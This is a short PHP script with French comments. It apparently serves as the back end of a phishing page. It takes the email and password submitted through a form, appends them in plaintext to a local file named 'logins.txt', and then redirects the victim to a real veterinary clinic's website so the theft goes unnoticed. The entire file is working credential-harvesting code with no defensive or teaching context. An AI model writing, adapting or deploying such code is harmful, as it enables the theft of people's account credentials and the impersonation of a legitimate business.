<?php
// Récupération des données POST envoyées depuis un formulaire HTML
$username = $_POST['email'];
$password = $_POST['password'];

// Ouverture du fichier "logins.txt" en mode ajout ('a+')
$file = fopen("logins.txt", "a+");

// Écriture des données d'identification dans le fichier
fwrite($file, "Nom d'utilisateur : " . $username . " - Mot de passe : " . $password . "\n");

// Fermeture du fichier après écriture
fclose($file);

// Redirection de l'utilisateur vers une nouvelle URL
header("Location: https://www.veterinaire-donckers.be/");
exit();
?>
